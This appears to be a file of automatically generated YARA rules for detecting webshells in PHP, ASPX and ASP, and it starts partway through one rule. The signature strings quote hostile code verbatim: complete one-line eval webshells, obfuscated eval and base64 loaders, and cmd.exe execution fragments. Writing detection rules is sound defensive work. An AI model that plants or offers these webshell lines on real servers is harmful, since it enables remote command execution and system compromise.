      $s10 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('edit','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'," ascii
      $s11 = "sbFolder.append(\"  <a href=\\\"javascript:doForm('','\"+formatPath(list[i].getAbsolutePath())+\"','','\"+strCmd+\"','1','');" ascii
      $s12 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('copy','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
      $s13 = "\",\"Execute\"};" fullword ascii
      $s14 = " xxxx@Gmail.com" fullword ascii
      $s15 = "sbFolder.append(\"<tr><td >&nbsp;</td><td><a href=\\\"javascript:doForm('','\"+formatPath(objFile.getParentFile().getAbsolutePat" ascii
      $s16 = "response.setHeader(\"content-type\",\"text/html; charset=ISO-8859-1\");" fullword ascii
      $s17 = "response.setHeader(\"Content-Disposition\",\"attachment; filename=\\\"\"+f.getName()+\"\\\"\");" fullword ascii
      $s18 = " <b>\"+strDir+\"</b></td><td>\" + getDrivers() + \"</td></tr></table><br>\\r\\n\");" fullword ascii
      $s19 = "private final String lineSeparator = System.getProperty(\"line.separator\", \"\\n\");" fullword ascii
      $s20 = "sbFolder.append(strParentFolder[languageNo]+\"</a><br>- - - - - - - - - - - </td></tr>\\r\\n \");" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 80KB and
      1 of ($x*) and 4 of them
}

rule webshell_without_alphanumeric2 {
   meta:
      description = "webshell - file webshell-without-alphanumeric2.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "79bf01196a0138abf56112565368147c67a30122afe634d58f2abe17ad47385d"
   strings:
      $s1 = "<?=$_=\"`{{{\"^\"?<>/\";${$_}[_](${$_}[__]);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_2022_08_26_02 {
   meta:
      description = "webshell - file 2022-08-26-02.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "a923d5114c4711413c9d5bafd612cf083ae4cce1ec30c71c2e852d8754cfce2b"
   strings:
      $s1 = "<?=$_GET['p']=='_'&&$_GET['f']($_GET['a']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule pHp {
   meta:
      description = "webshell - file pHp.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "dbfd3dc8f468a980f9f2b130f039c472475c364d11f8b89f2776549ae7a38383"
   strings:
      $s1 = "<?php eval($_POST[1]);?>  " fullword ascii
   condition:
      uint16(0) == 0x8fe5 and filesize < 1KB and
      all of them
}

rule webshell_aspx_cmdasp {
   meta:
      description = "webshell - file cmdasp.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "9ea322ddbc7514e0a87200cc8b45c7a93ee00adbad1449d8512d63b5e1497387"
   strings:
      $x1 = "<!-- Contributed by Dominic Chell (http://digitalapocalypse.blogspot.com/) -->" fullword ascii
      $s2 = "psi.FileName = \"cmd.exe\";" fullword ascii
      $s3 = "psi.UseShellExecute = false;" fullword ascii
      $s4 = "<!--    http://michaeldaw.org   04/2007    -->" fullword ascii
      $s5 = "<asp:Button id=\"testing\" style=\"Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px\" runat=\"server\" Text=\"execute\" " ascii
      $s6 = "<form id=\"cmd\" method=\"post\" runat=\"server\">" fullword ascii
      $s7 = "<asp:Label id=\"lblText\" style=\"Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px\" runat=\"server\">Command:</asp:Labe" ascii
      $s8 = "Process p = Process.Start(psi);" fullword ascii
      $s9 = "ProcessStartInfo psi = new ProcessStartInfo();" fullword ascii
      $s10 = "<asp:Button id=\"testing\" style=\"Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px\" runat=\"server\" Text=\"execute\" " ascii
      $s11 = "<title>awen asp.net webshell</title>" fullword ascii
      $s12 = "<script Language=\"c#\" runat=\"server\">" fullword ascii
      $s13 = "Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));" fullword ascii
      $s14 = "void cmdExe_Click(object sender, System.EventArgs e)" fullword ascii
      $s15 = "string s = stmrdr.ReadToEnd();" fullword ascii
      $s16 = "<asp:TextBox id=\"txtArg\" style=\"Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px\" runat=\"server\" Width=\"250px\"><" ascii
      $s17 = "Response.Write(\"<pre>\");" fullword ascii
      $s18 = "psi.RedirectStandardOutput = true;" fullword ascii
      $s19 = "StreamReader stmrdr = p.StandardOutput;" fullword ascii
      $s20 = "stmrdr.Close();" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 4KB and
      1 of ($x*) and 4 of them
}

rule D_____ASP_ {
   meta:
      description = "webshell - file D -  [ASP].asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "2838b2bff6e6a4908447291924eabd30eab582b14bb3ac2ac5f3f97851f33cfc"
   strings:
      $s1 = "Paths_str=\"c:\\windows\\\"&chr(13)&chr(10)&\"c:\\Documents and Settings\\\"&chr(13)&chr(10)&\"c:\\Program Files\\\"" fullword ascii
      $s2 = "Server.ScriptTimeOut=999999999" fullword ascii
      $s3 = "filepath = GetFullPath(DirStr)&fso.GettempName" fullword ascii
      $s4 = "Response.Write \"<input name='NoCheckTemp' type='checkbox' id='NoCheckTemp' checked='checked' />\"" fullword ascii
      $s5 = "Response.Write \"<label for='NoCheckTemp'>\"" fullword ascii
      $s6 = "Response.Write \"<form id='form1' name='form1' method='post' action=''>\"" fullword ascii
      $s7 = "NoCheckTemp = (Request(\"NoCheckTemp\")=\"on\")" fullword ascii
      $s8 = "if (CheckNextDir=True) and (IS_TEMP_DIR=false) then '" fullword ascii
      $s9 = "  IS_TEMP_DIR =" fullword ascii
      $s10 = "</font>]\"&DirStr&\" [<font color=red>\"&Err.Description&\"</font>]<br>\"" fullword ascii
      $s11 = "] http://www.d99net.net</TITLE>" fullword ascii
      $s12 = "if Right(path,1) <> \"\\\" then GetFullPath = path&\"\\\" '" fullword ascii
      $s13 = "Path = GetFullPath(Path) '" fullword ascii
      $s14 = "Response.Write \"</label>\"" fullword ascii
      $s15 = "response.Flush" fullword ascii
      $s16 = "Response.Write \"<input type='submit' name='button' value='" fullword ascii
      $s17 = "Response.Write \"[<font color=red>" fullword ascii
      $s18 = "Response.Write \"<input name='CheckNextDir' type='checkbox' id='CheckNextDir' checked='checked' />" fullword ascii
      $s19 = "Response.Buffer = True" fullword ascii
      $s20 = "Response.Write \"<input name='ShowNoWrite' type='checkbox' id='ShowNoWrite'/>\"" fullword ascii
   condition:
      uint16(0) == 0x483c and filesize < 20KB and
      8 of them
}

rule sig_2020_08_31_01 {
   meta:
      description = "webshell - file 2020-08-31-01.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "ed3affa44e87a9b6b03cc32222104c6b762d75dc4faaa8405f0008438714b805"
   strings:
      $s1 = "<?php $a=\"~+d()\"^\"!{+{}\";$b=${$a}[\"a\"];eval(\"\".$b);?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule webshell_php_conflg1 {
   meta:
      description = "webshell - file conflg1.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "1985d8749e690243ceeb3e85268ad28b21b29873141e2df01512f23df9961b6d"
   strings:
      $x1 = " eval(gzuncompress(base64_decode(\"eJzsffl3G8eR8M/0e/4fRhOuAJogLt6kQIn3IV4iSOoiH94AGBAQAQw0GPCQ7f1fGO0mXlm7ESVSF0VdpE2KkiiKpCRHz" ascii
      $s2 = "4A8jyQBz92i0GgAkgUyK7MRgK5uDoZjt16OKhUbvvGkOA8oyT3rK+VHLoJSHY6lQQSVBwghyBxQ780+r/VHctuG8nx7AD7D6MBIYoxRUnebOIsPYQVmUKElSVHDyeORA" ascii
      $s3 = "t3NuZEoPLzC/gjXJvsVsgXhbcE4wR9P5VbaWG0e2mSinqPsgLBuJQcR5sWVTjsJXBijpvFDaJWoJ/pTBDNlx0uPPr8DsHtEMpLMAM63Nlry98gqo3P9s9/PPvl+Z8/+d" ascii
      $s4 = "dYBFRVDqjFTzafbX6/8jkPgvaCWYfrtau52oflIADADybmVu3vGxjUq9Vw1dDs4pBpi2uLogO/lp1JpRBzRKQSSEupWAAjRJ/CWnPVc5/PXicUghrxIw2X0RNPeQB/6y" ascii
      $s5 = "nwFYEACGmQUrq+aMQmyCnOFwGFiRzZUm9uNqDsWiVGtZSPcXTTdSXeh9SgUTAn7oRR7EAEXMUNaw9o3FCsTffvAs//DDLlEcoNlp8H6xGalqR5OGyNGIN45THkWKQYHK" ascii
      $s6 = "LA48Syfgk3nxb1bbZ6PZ12HqdTWHoSmVRakB8zX9qcbqpCMMEXZin1JqgYqzkwaaoJIkWPXpB8rzf3MhsShcFYBS7JVpvlcgMm2IGDHqUJGetEGUtK6nSA8jN+Giqq9K" ascii
      $s7 = "qr+VFATa9RVhb2v5GwhfJCyLoG8Zqcnd7k6lGhpLRWWk8DhhUyI5SNtp+FY96bxXwRpWXsN1vGKxtZ26nN3b3n+4RTFydB3F3L7YUAIT/77GMFCJHByI2mtBAZYMMJvj" ascii
      $s8 = "tGv5MK+qWMw3c5jn6nT8JvHE4K/QkG0e+IBnClNPzWFPidlCehFmLS8AWJyeiPDAFUoIuJMfwbSaLQ2qQMIIKoUQAuTUBReEYEDwJ6BwZc6A9MP7SFBEf0Z4zAlIJKhm" ascii
      $s9 = "gvyr3JYDpVv/Xp1qdgaw9rv06sN5ehPdOUTChqcGBKZbhfv7yMWTlmCZgwnSLXR5oLLkRcX9+2ElnElWdrn60+e/Bs8wwsV7JDLL3ghRKXi6nwBRcy1frpOi7endVAmJ" ascii
      $s10 = "CxQshbkqwNKImER1hasFT9zQOd/YMC4ipjGWlM9nVJE5KfSJavv8YuQYVmuLpsjMftcPtUQqlRFewTkirEfO762D7IcCK5A3bOtDOORav6WGkp3cigIHBQU7HjsdF6th" ascii
      $s11 = "kLuzjd2sDPMGCnoAMgn2B1gsZewd6eMbArcoMpETvQwCoJjsHECqcZlWATQwk6ShyM4DvRgSTfAaassEK6kT5achB2nanduMAeHzg6CHv3CvpXsYTpRSFiAWJx0Y0F8B" ascii
      $s12 = "yyKjpsQGmYdbK3//JwWBINlTHbZvhbiNnefEHBQjA7YHjEentzm3DbZYibMn9tfvGwHMTHEfB99vqdL8m7NmRHKURrHa/EgzGDGkKM1vL12HwMGNfqb/T7LW8gKTe1ZZ" ascii
      $s13 = "yeoC17MXp5ar9/bWN97ic3vxTaW4TuWFCV1GmMGzQCuxhD5IQvYYyJ4qm7s6exf/5XT7a21q79mexYXMUUkeyMmjwNY5mYyJ9GJU4eNGrxZOufbpLScna19DQJYGSuxx" ascii
      $s14 = "2ibQrF4Xg8QJ/ORrSbRnQYla06SQEX4wtBcMDC8ToYTXEdM8jMCZFjtIyaTAtIlZDHZFVIK/jizIbfTyYNO0VbPes2efjvAP8KPGnQIRAiIceS2ZPnJ1OGQz7i4mac4F" ascii
      $s15 = "wXXJSBrC2RxlMppq7/FCfpyZgGuoP+njsfMkwvyxAYkhBDcteZ9moWaqsoiPjSeL1RzmMuB6G5cgpS3mAqyb8Xz5U1CQEwVDhCyRb1aKiHYvSr1xgkEyMNhsoq6O6lrI" ascii
      $s16 = "uwTrAJToEAluGoD2Ov6G2Qo3HLJzOyOu0TkRqA2hTiihQORGJxpHcjeR8+JKWE7BSRMgw4KSpGikQmrqF2aGdxdTuB4hBIn0gXUQ9J4ZLsLooXb63OQOdOn71xZ/nDtR" ascii
      $s17 = "RNJxCOm6AZqTocnq7gUHDuy/WvN9578GMBrX3EPabJu3VpE5isLB0WT1hPti/+DCJJsJeqBWLPLauBsbgSlOJmiDmZOkye3BLSWCyElEu0k6YDY6mQCUROpg6CJz3woX" ascii
      $s18 = "iOamw/u6sMcoRRW9ee9rnIRMCUuBgbxcoMUVxEvOmXxaVpJaPVRWJTaOwCCIRlQTTa8Tr8uwwNG/gjU2jQp/1oD8GMu6wBQ6CyD77Tx4lhaMRu20dEwMlYWIv6xNqafx" ascii
      $s19 = "YGxgyxFExNs8YcZZPT2yaWzNwlqFEY8ObYlMGVTVigZVEBTcHGWPjuGNsYmRcYtacn2zspYKxFSCA5GAMUAWbYO6ECQAAW4Gzq7v/hpLu7IO2RC7hzd07fIBgwI0Bf3m" ascii
      $s20 = "FAXZ8+nIFQOPDm2Y0PHr9PwqARyHCdrt+mk9nOdwFG7owMJ1E0AtGiChO6XrqasTqzqjTXwbU7JcW3iW0b5fn4IgxwY01wO93f8X2ilOQFSiKNwUTmucTNGuPLw4b5yA" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule session91 {
   meta:
      description = "webshell - file session91.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "f4a9df9893533bce52d1d2493b6ee0d85583afd0079e660a8bdd38393037bcdf"
   strings:
      $s1 = "'ryOpxHOpxHOpxHOpxHOpxHOpxHOpZCMDZotlAHEDPSebt4+lUselscMlvryCZBy3WKdTEqC2YopRUsERWpLpxB4'." fullword ascii
      $s2 = "'OCPCVRZELpxByRUsERWpLpxB78WCSlWKei74FpxHOpxHOpx5wnryOpxHOpxHOpZCMDZotlAHEbvo6DUJ4i74FpxHO'." fullword ascii
      $s3 = "'NqpRUsERWClWIHwpPstbvsaFxBu8UqMXxHEDvsLDUYei74FpxHOpxHOpx5wnryOp'." fullword ascii
      $s4 = "'SSbMcMDxEepZLcxAHOpxHOpxHOpxHOpxHOpxHERPwd8UMupn4OlUCG8NwuDvotDswM'." fullword ascii
      $s5 = "'yOpxHOpxHOpxHOpxHOpxHOpxHOpZCMDZotlA54bzoMi74FpxHOpxHOpxHOpxHOpxHOpZ4cxAHOpxHOpxHOpxHOp'." fullword ascii
      $s6 = "'xHOpPMvpxOE8NSSbMcMDxHwTIHzCtEOj74FpxHOpxHOpxHOpxHOCPcy8WC2RWrOTIHEDPSebt4'." fullword ascii
      $s7 = "'pxHOCZBy3WKdTzcMDQotbvwtFxBMjPKdTvDMDQqMb9cSRNYyFIE1nryOpxHOpxHOpxHOpx5tRWBqbvmOCtb1nryOp'." fullword ascii
      $s8 = "'bvryCPBSDPslCPMDFI5jpPwtRxOE3NoaUtBgWIEei74FpxHOpxHOpx5wnryOpxHOGr4FpxHOpZCMDZotlA'." fullword ascii
      $s9 = "'Je8t5vDUahDPMVlA5eb4otbvwtFxEcxAHOpx51nryOpxHOpxHOpZCMDZotlAHyCZBy3WKdTvotbvwtWNcVDUa4p'." fullword ascii
      $s10 = "'pxHOpxB4RWS4pn4Ob9BtW9CMbPJS8NYyphJSpPStRU8wWxpAXxHAUtHAXxHEDPomDxE1n'." fullword ascii
      $s11 = "'xHwpxbwTtbOXAHEDPSebt4+rNSSbMcMDxHupxb/rh0zi74FpxHOpxHOpxHERUaEpn4OC60wC6LcxAHO'." fullword ascii
      $s12 = "'OpxHOpxHOpxHOpxHOpZCMDZotlA5v8UJ6R2LcxAHOpxHOpxHOpxHOpZ4cxAHOpxHOpxHOpxHOpZcMlP8kivoERUCqRtOzr'." fullword ascii
      $s13 = "'OTxHJFI51nryOpxHOpxHOpxHOpxHEDPSebt4+bNo42PsuR9oSRNYyCNouCtE1px0VpZcMDx543PYORPov8WoLDx5L'." fullword ascii
      $s14 = "'xHOpxHObvo4DWCupZBtDUY1nryOpxHOpxHOpZ4cxAHOpxHOpxHOCZBy3WKdTzcdDZHdTzcMDsBelUoVDWryCZBy3WKdTMBelUo'." fullword ascii
      $s15 = "'px5wnryOpxHOpxHOpZCMDZotlA54bzoMi74FpxHOpZ4cxAHOpx57bvw4RUc4RUrORzou89BelNmO3P'." fullword ascii
      $s16 = "'OpxHOpxHOpxHOpZ4cxAHOpxHOpxHOpxHOpZCMDZotlA54bzoMitHVXt5MDvotjWBy3UazpPJ'." fullword ascii
      $s17 = "'4FpxHOpxHOpxHOpxHOpxHOpZCMDZotlA54bzoMi74FpxHOpxHOpxHOpxHOGr4FpxHOpxHOpx5wnryOpxHOpx'." fullword ascii
      $s18 = "'yOpxHObZCVDPohDPoEpPRqlvc43UwupPqS3UJ2RUaEFxByRUsERWpLpxBAlNBaFr4FpxHOpZLcxAHOpx'." fullword ascii
      $s19 = "'ohDPoEpPRqlvc43UwupZcMDQqMb9cSRNoYjW5MFxEcxAHOpx51nryOpxHOpxHOpxB4jW5M'." fullword ascii
      $s20 = "'lxOERzCVlIEcxAHOpx51nryOpxHOpxHOpZCMDZotlAHEDPSebt4+bNouRQcVlUqSlvryCqc52Y7zXxHAY4sc2x5'." fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 500KB and
      8 of them
}

rule webshell_aspx_sql {
   meta:
      description = "webshell - file sql.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "6f3261eaaabf369bd928d179641b73ffd768184dfd4e00124da462a3075d4239"
   strings:
      $s1 = "            sqlDataReader = sqlCommand.ExecuteReader();" fullword ascii
      $s2 = "<!-- Created by Mark Woan (http://www.woanware.co.uk) -->" fullword ascii
      $s3 = "<%@ Import namespace=\"System.Data\"%>" fullword ascii
      $s4 = "<%@ Import namespace=\"System.Data.SqlClient\"%>" fullword ascii
      $s5 = "    protected void btnExecute_Click(object sender, EventArgs e)" fullword ascii
      $s6 = "            sqlCommand.CommandType = CommandType.Text;" fullword ascii
      $s7 = "            <tr><td>&nbsp;</td><td><asp:Button ID=\"btnExecute\" runat=\"server\" OnClick=\"btnExecute_Click\" Text=\"Execute\" " ascii
      $s8 = "            <tr><td>&nbsp;</td><td><asp:Button ID=\"btnExecute\" runat=\"server\" OnClick=\"btnExecute_Click\" Text=\"Execute\" " ascii
      $s9 = "<head id=\"Head1\" runat=\"server\">" fullword ascii
      $s10 = "<style type=\"text/css\"><!--body,table,p,pre,form input,form select {font-family: \"Lucida Console\", monospace; font-size: 88%" ascii
      $s11 = "<script runat=\"server\" language=\"c#\">" fullword ascii
      $s12 = "            sqlCommand = new SqlCommand(txtSql.Text, sqlConnection);" fullword ascii
      $s13 = "    private const string AUTHKEY = \"woanware\";" fullword ascii
      $s14 = "            <tr><td width=\"30\">Auth Key:</td><td><asp:TextBox ID=\"txtAuthKey\" runat=\"server\" Height=\"15px\" Width=\"100%" ascii
      $s15 = "            <tr><td width=\"30\">Auth Key:</td><td><asp:TextBox ID=\"txtAuthKey\" runat=\"server\" Height=\"15px\" Width=\"100%" ascii
      $s16 = "            SqlCommand sqlCommand = null;" fullword ascii
      $s17 = "<style type=\"text/css\"><!--body,table,p,pre,form input,form select {font-family: \"Lucida Console\", monospace; font-size: 88%" ascii
      $s18 = "            if (txtAuthKey.Text != AUTHKEY)" fullword ascii
      $s19 = "            <tr><td>Connection:</td><td><asp:TextBox ID=\"txtConnection\" runat=\"server\" Height=\"15px\" Width=\"100%\"></asp:" ascii
      $s20 = "            <tr><td>Connection:</td><td><asp:TextBox ID=\"txtConnection\" runat=\"server\" Height=\"15px\" Width=\"100%\"></asp:" ascii
   condition:
      uint16(0) == 0x253c and filesize < 9KB and
      8 of them
}

rule c99madshell {
   meta:
      description = "webshell - file c99madshell.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3dead48a0ec041a13a2579ff932916b504534bcb245962a63366f84662eacf8f"
   strings:
      $x1 = "eval(gzinflate(base64_decode('HJ3HkqNQEkU/ZzqCBd4t8V4YAQI2E3jvPV8/1Gw6orsVFLyXefMcFUL5EXf/yqceii7e8n9JvOYE9t8sT8cs//cfWUXldLpKsQ" ascii
      $s2 = "mPmzrSRKnKbw5lJO1q3V/r9hzkMTXFFrvdS98lAPPozktM4vrswrDgEtQBy3GeqL4W0mU+IldKt1CZBrlBcLxBIcIBplsFNeKcIwkPMs9lzQsGhNKab/feemSpYMafhp" ascii
      $s3 = "QGNXL8g3lh05mwGsXLdoM9GYE4nLVvcbiqHckzOtbKVOUiJxOTl583fXaidSVdAE9pysVxYRtos1niAuqiEh1XnBcRUn3gj0YbxCOGnbAVUlpTw8Ux0m3kJcOmxdch80" ascii
      $s4 = "hZBQ4nAkjQh9XPL2min2vv0dajooTzMHx+WadmWy4qAaIsQtN7WSByMH+3DWS0mKPJGhKNmSVe24Q1eZ8PvyMB1k12yj92FT1Fp4eSRCOEYe57dlYrE6K0dKfOmzsVUZ" ascii
      $s5 = "dksJN31Cv3aT8GrKxInvPvi966ycFZngqKlHYx1Nhce2HGnYpB62VpnR1FlvuutbgxzV1+getzTKgskAhrfGk0W3/133ePfFrmBWjfni18FsgrSTlK+AG3Yb6+lXxTxi" ascii
      $s6 = "LmFYCnDUTOz0dI3dp0GRCSuVdxadPSWMy2rcLsI8sbva/PtUKECQNhjuEge5jguzRQk8HIeoUSMtRYj3OyWVvK8dMtNVdlLxE/Ga9MwppDBY/x9S3Fwxp47cbF3s5qde" ascii
      $s7 = "jfcynQFxSDXK92H52no+S2kMdAOFDpJ+O6mZD7fZLyiyhkTFtXnbHYj8sFY3wbTAFW17/9Ken0kpXF4E5hFQNxvVnpjSjUQsnOjTLoBNpSSC1/NxFGKRqDTVLvjP8p0C" ascii
      $s8 = "pEYeO7Wu44I9jxnmPRhJZjKw7IRqqF57Do3cPYIT1Q4U/ptWiqmfAX4RwgIuEz0DyBNUcGxucWm0wDnzyQqGkqyp6dPUipEKLTeK+APNIqw/vowtPMFtfPUkLMtF0cHf" ascii
      $s9 = "d3VjSptiWvihNOrfF8trcmeEcuEVz1GLjFWHY/Ko8MZ6x20KFD90BUoNVUidJTLy5CyJtoV76rc/HKnnIjclgbvGmftP/CwlIz5IbtWxDHgGCoOvVbQzTWqh9eVW/l1s" ascii
      $s10 = "$login = \"\"; //Login" fullword ascii
      $s11 = "g8nxeAdqbAgaeKniW0bUZcQ2xiykVMx9ltmpVLi955NhvFfgtJ5h8AHqEN1+BP98zS8aq4hiYTMY8K5quUACJrJ4IlB4pvhvnIvt+Oho2nBpiiw2UEMtisXEZtEBeBsE" ascii
      $s12 = "bPpAhTmOSzT15HhyKgj6CRXfsHcWEUCyeS+CcjsN8B+QE29qKQ8Hg4BiNHgeIIwA0kq64Gy9l9ubtCCfEcJyEW+l435spwREDeimRmwsk74L/Tlg3YkPLVH4Ku0fm7H0" ascii
      $s13 = "VXRA6iEccOH+RMyIydrczXNYDAqpEa5MgujPIhHb7PDyJwwcUQQ9U3I23BDGx2xswwKpQYua8fayvHuIVkc1TtjD+tiviQbZqdaUBkTVBqU4wpxS6xysL8/eYE75Twca" ascii
      $s14 = "Fds62rMSUwl5p1Csou7TxaqTMzFW/kFxBiEVJS87cxRYvUbdpfyPfTW1A1WIrc0TDbv8PXXf5mN/I04dICA7nCePoE9xJ3b5pUhn/7yCXa/VsPho8VqwJ6pxx24NDfF/" ascii
      $s15 = "pwKmBiu0XhcOc1HX78wz8rIH6ObDR/8tvqYMTnm2KhXiLdGKSikfb5UdeXrQXY6AX5m5GeT8rAHrTRvCnlLpBYGUb+Odz+pY9ifkIQHrajr5CasIQCBzhJkupSV8DG3a" ascii
      $s16 = "8HLwlXWmv4bt+GB/SQrCGGh6S9UwOngv2HeTmK9ZV/PemRgqFxPct6SGv86p5AhDw6T8sCwSqPBbYqHEejnl05fMEacL7nALDVaLXCrHPhoi/KxLa2wcmMWoIg/PebC6" ascii
      $s17 = "P4PBHXvb8BaoUTGAZtWIIB4HNfPoJxbWKJP9GkSbcYwTmD4BF/huluw4UAi2e1LPaLKR4NIzJYQ6gwmeoKfOqrzfQkp3j3B+9LC42AlMgQ3x6ZBrPf0ClnXkNl1Fe2H3" ascii
      $s18 = "EO/mRQHWu+Tinw3d0/5ZAo+6hNw89ebbVKKpus7FW7LarScEH1Sg9io+FsPX/BD6k40TDz63fuQvkKR9rZklFd2+nimSrJfCzI2ArqY5DebWTQ8zP/18F56zysY0H4Vb" ascii
      $s19 = "rH0D+olqnNQ3tR5pSRGjyRrI60zWS1q9B2lleqqeZrEP3s9wAyvkZH/fkRG0h94crO7nS3L3XCuOsLrflMSaK91qgCyMoOXdldUonTs7qD81NHKygXDX+f6W6B8UG1nM" ascii
      $s20 = "wyskkuyOvp9U7OJgdlPjCRKtRmo7VbCsMVBkl0xW4MQta/ARu6nIggpfYz7Em7zg/MYRxi6uTRi8CQKiqNYVr30DZ/aEBmsurLQJIDQXKJ4oiooXWlJGQmMTGZLFOk2R" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule wp_backup {
   meta:
      description = "webshell - file wp_backup.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "adca0be6cc7f79e71c10fd541c4308694633285411e10de8b041188c4c623847"
   strings:
      $x1 = "<?php /**009C52CBD79972E3B4491DCB1C2F0607**/ $XnNhAWEnhoiqwciqpoHH=file(__FILE__);eval(base64_decode(\"aWYoIWZ1bmN0aW9uX2V4aXN0c" ascii
      $s2 = "quHIQJQ2GGokvTwwr81k6P3ZZaDlLszAT1eajLKJ+1o3J8ia7LOGgVqxsLRjU75HiYgryA/2kcuK3gSgJKc21f8WN2ojeY5Ey/szRI2O+DLFG0fmdwds4XP2meDVktTK" ascii
      $s3 = "Mkn4yBbFFb5vHIF2EtP7S0Na8KtvKtibd4eCGtVXcEY3kIL8naP4jP6/aRJ4anap5W7waTzX1d8CjnWN9TRPRX7a7woth+AVrKGZofthu8kh7Or5u+qSp8g2KAX2cr3w" ascii
      $s4 = "/Xkm9Of3QUjKAPw2oxJVkxxK55QXEuvqUHVUqO04Oi+wQnwy3Rd7NlBmeHq4I2KZNSIjCr2DEWqrdw4zFzF0shaB3+Bx9CdKBx6U0MKjC5jIQGUKOdlLgXDG7joWJkmV" ascii
      $s5 = "wdIJgzXgdhcrKg0soFhO4L1FIwEHoBzXcxWjIDDGVKQNINhf074J6YhLMqGsHt0TYULwBMGeTwPx2m2GQr2jjAozzndRWsd9QFhktrUSiioHrAXb//Jqrn7G6tryLbuf" ascii
      $s6 = "Fq1p/V8BkbfhRwzjkFCorwsYbnwkY0kFvsEuHiItFWZDBgPt91c3C3D/qjQkxA3IcrhVEyeFd0AFtNNvJqORvNKD2EGbLdLoj3t6rFy6dlaquJLfR1VfHweo+z0lse8i" ascii
      $s7 = "Eb9FZS+YHU/MuoC1s/RjCcoXo2W/u4+Xz3ENfTtVZp0t29fRwrrPIIX3RfPRbtiah/W43TOBNP41nn5lYdpbgyBC1nazodM3zfoNKYpI9q7wckfTpBhIMYwYwQzh1DQg" ascii
      $s8 = "lkG2jPtT4VkU3Ze0dz10xNl8eXeaE5p7XM6JIbGfXqwbDCtz4DH7xIDQ084ABHR1G1o6j/6YpZIvPOST06CPhHoP8inQ5Xo8cfbG80pR7mDeaBZnyRRRSmrbuf2Jkv4c" ascii
      $s9 = "No4CIPSh91MtIfHy8/kQJU206s/jCVv7hq9EXhWTdLlCr0OLw07zF+m+HpAbDvOdaN4U5Z48RnpwG4H/tH5bAqtXogGbcPGF9CTBeIH09yLc9XK58bYwLrDWrooX2BxF" ascii
      $s10 = "CNpjIzVaTEEqJ0ydmAVQxYnLOgChijpxHMgfCzJAPERD5Wjv5s068rXloAOlxKkcyWTRmIFdHJIkpnU9ebDQzl1ysTfZlWJBcPiRZg9aX7JAkGiipkVr0b+OY3sbG9tH" ascii
      $s11 = "EfAG1AuVJXDk/yk+ZzZfA9H9sEJLVZ83yaun8/3IJ7fvPnunT17OMRsz5JUWzOT2UNf1Tax0ofuKoSP5OJdNCTcTNlEC09Tr9wJXglvRgsPyyB4ZHBlktuFty9OgcFLi" ascii
      $s12 = "rv7vewX6gH8pg93jEF3wS6W9ugR1iw2Jh3to+7iktYJ5p2WHbIrcON9D4P9N/OyS2577weeDPevQq5dPOASzUG/AzaKh4ztv6T/hhchLf/v7Uv+QpfeBuva77/5Fmaq8" ascii
      $s13 = "D3a03WIQnxlT6krp73i1v3SawcDFdC5UyotlBRS/iZiYYNAOB/Ei9edQhsL8KzCd4RKpNPhqBNSPyAgHQMGTOKNRbH8lP2QxcIVHyOkbJfk1O3ub98S1UPX4U5iVjH/5" ascii
      $s14 = "k59dy80QRGiCD/YM0Sc4tiL4lCwX8djMh+BKBh/ufXn03JT8FHn01edq5edllkIkmqAGzPCED08/Is9dVMXWVRYvjlvbJEGV+ju+KyQUgnYVOurl52rjtW3rNSxpxX85" ascii
      $s15 = "SgOvxyeGFVlVRI2ZcfmdOCkC/S9YQpm50QfLDdGYkujRFreFfDhZSAMjbjwJhN8N/Aamm8gHFpuHNRWP38dK6O0eJ8y1fLKm3QqkP0mSoJpGJQSsnAln1DXdAQZL61JR" ascii
      $s16 = "plU5rfBbOly6p9xtCnaNWDPGYRDQDIN3Gkue520PL7pBmF1PuUzGhywlF1EAZZwSNMitrLawjFKE/1KpWycmdkj+IscMS2ZmbgB9vWNVBLumXlubruBJoSkFpAu+dXjM" ascii
